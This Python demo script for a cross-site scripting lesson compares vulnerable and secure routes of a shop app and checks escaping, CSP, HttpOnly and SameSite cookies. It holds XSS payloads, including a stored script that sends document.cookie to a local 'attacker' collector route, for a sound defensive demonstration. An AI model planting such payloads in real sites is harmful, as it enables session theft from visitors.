"""
Demo for the cross-site scripting module (Nitin Thota).

Runs both versions in-process with Flask's test client, so no server is needed:

    python demo_xss.py

Scenario: a visitor searches the shop and a customer posts a review, both
containing a <script> tag. On the vulnerable routes it would run in anyone
else's browser (cookie theft, page defacement); on the secure routes it just
shows up as text.
"""

from app import app
import misconfig

PAYLOAD = "<script>alert('xss')</script>"


def banner(text):
    print("\n" + "=" * 70 + "\n" + text + "\n" + "=" * 70)


def login(client, username, password):
    client.post("/login", data={"username": username, "password": password})


def reflected_demo():
    banner("REFLECTED XSS: product search")
    c = app.test_client()

    r = c.get("/xss/vulnerable/search", query_string={"q": PAYLOAD})
    vuln_body = r.data.decode()
    print("1. Vulnerable page, raw payload present:", PAYLOAD in vuln_body)

    r = c.get("/xss/secure/search", query_string={"q": PAYLOAD})
    secure_body = r.data.decode()
    print("2. Secure page,    raw payload present:", PAYLOAD in secure_body)
    print("   Secure page,    escaped form present:", "&lt;script&gt;" in secure_body)

    return {
        "vuln_raw": PAYLOAD in vuln_body,
        "secure_raw": PAYLOAD in secure_body,
        "secure_escaped": "&lt;script&gt;" in secure_body,
    }


def stored_demo():
    banner("STORED XSS: product reviews")
    c = app.test_client()
    login(c, "alice", "password123")

    c.post("/xss/vulnerable/reviews", data={"body": PAYLOAD})
    r = c.get("/xss/vulnerable/reviews")
    vuln_body = r.data.decode()
    print("1. Vulnerable reviews page, raw payload present:", PAYLOAD in vuln_body)

    c.post("/xss/secure/reviews", data={"body": PAYLOAD})
    r = c.get("/xss/secure/reviews")
    secure_body = r.data.decode()
    print("2. Secure reviews page,    raw payload present:", PAYLOAD in secure_body)
    print("   Secure reviews page,    escaped form present:", "&lt;script&gt;" in secure_body)

    return {
        "vuln_raw": PAYLOAD in vuln_body,
        "secure_raw": PAYLOAD in secure_body,
        "secure_escaped": "&lt;script&gt;" in secure_body,
    }


def defenses_demo():
    banner("DEFENSE IN DEPTH: CSP, HttpOnly cookie, JS-context encoding")
    c = app.test_client()

    # 1. CSP header on the secure pages only.
    secure_csp = c.get("/xss/secure/search").headers.get("Content-Security-Policy", "")
    vuln_csp = c.get("/xss/vulnerable/search").headers.get("Content-Security-Policy", "")
    csp_ok = "script-src 'self'" in secure_csp and "unsafe-inline" not in secure_csp
    print("1. Secure page sends a CSP that blocks inline scripts:", csp_ok)
    print("   Vulnerable page CSP:", vuln_csp or "(none)")

    # 2. HttpOnly and SameSite=Lax on the session cookie: on in hardened
    # mode, off in vulnerable (SameSite would also block the CSRF demo).
    r = c.post("/login", data={"username": "alice", "password": "password123"})
    cookie = r.headers.get("Set-Cookie", "")
    httponly = "HttpOnly" in cookie
    samesite = "SameSite=Lax" in cookie
    httponly_ok = httponly == (not misconfig.VULNERABLE)
    samesite_ok = samesite == (not misconfig.VULNERABLE)
    print(f"2. Session cookie HttpOnly: {httponly}, SameSite=Lax: {samesite} "
          f"(expected {not misconfig.VULNERABLE} for both in "
          f"{'vulnerable' if misconfig.VULNERABLE else 'hardened'} mode)")

    # 3. The search term handed to JavaScript is JSON-encoded, not raw.
    body = c.get("/xss/secure/search", query_string={"q": PAYLOAD}).data.decode()
    start = body.index('id="search-data">') + len('id="search-data">')
    block = body[start:body.index("</script>", start)]
    js_ok = "\\u003cscript\\u003e" in block and "<script>" not in block
    print("3. Search term in the JS data block is encoded:", js_ok, "->", block)

    return {"csp": csp_ok, "httponly": httponly_ok, "samesite": samesite_ok, "js": js_ok}


def cookie_theft_demo():
    banner("COOKIE THEFT via stored XSS, and HttpOnly blocking it")
    from xss import STOLEN_COOKIES
    STOLEN_COOKIES.clear()
    c = app.test_client()
    login(c, "alice", "password123")

    # The attacker stores this review. In a browser the <script> runs for
    # every viewer and sends their cookie to the attacker's collector route.
    steal = "<script>new Image().src='/xss/attacker/steal?c='+document.cookie</script>"
    c.post("/xss/vulnerable/reviews", data={"body": steal})
    served_raw = steal in c.get("/xss/vulnerable/reviews").data.decode()
    print("1. Steal payload served raw on the vulnerable reviews page:", served_raw)

    # The test client can't run JavaScript, so we model what the <script>
    # does: read document.cookie (empty when the cookie is HttpOnly) and call
    # the attacker URL. HttpOnly is what decides whether anything is sent.
    login_cookie = c.post(
        "/login", data={"username": "alice", "password": "password123"}
    ).headers.get("Set-Cookie", "")
    httponly = "HttpOnly" in login_cookie
    document_cookie = "" if httponly else "session=" + login_cookie.split("session=")[-1].split(";")[0]
    c.get("/xss/attacker/steal", query_string={"c": document_cookie})
    stolen = STOLEN_COOKIES[-1] if STOLEN_COOKIES else ""
    print(f"2. Cookie is HttpOnly: {httponly} -> attacker received: {stolen!r}")
    print("   /xss/attacker/log shows:", c.get("/xss/attacker/log").get_json()["stolen_cookies"])

    theft_worked = bool(stolen)
    expected = misconfig.VULNERABLE  # theft should work only in vulnerable mode
    print(f"3. Cookie theft {'succeeded' if theft_worked else 'blocked'} "
          f"(expected {'succeed' if expected else 'blocked'} in "
          f"{'vulnerable' if misconfig.VULNERABLE else 'hardened'} mode)")
    return {"served_raw": served_raw, "theft_worked": theft_worked, "expected": expected}


if __name__ == "__main__":
    r1 = reflected_demo()
    r2 = stored_demo()
    r3 = defenses_demo()
    r4 = cookie_theft_demo()

    banner("SUMMARY")
    print(f"Reflected: vulnerable ran the payload -> {r1['vuln_raw']}, "
          f"secure escaped it -> {r1['secure_escaped']} (raw present: {r1['secure_raw']})")
    print(f"Stored:    vulnerable ran the payload -> {r2['vuln_raw']}, "
          f"secure escaped it -> {r2['secure_escaped']} (raw present: {r2['secure_raw']})")

    assert r1["vuln_raw"] and not r1["secure_raw"] and r1["secure_escaped"]
    print(f"Defenses:  CSP -> {r3['csp']}, HttpOnly -> {r3['httponly']}, "
          f"SameSite -> {r3['samesite']}, JS-context encoding -> {r3['js']}")

    print(f"Cookie theft: payload served raw -> {r4['served_raw']}, "
          f"theft worked -> {r4['theft_worked']} "
          f"(expected {r4['expected']} in this mode)")

    assert r2["vuln_raw"] and not r2["secure_raw"] and r2["secure_escaped"]
    assert r3["csp"] and r3["httponly"] and r3["samesite"] and r3["js"]
    assert r4["served_raw"] and r4["theft_worked"] == r4["expected"]
    print("\nAll checks passed.")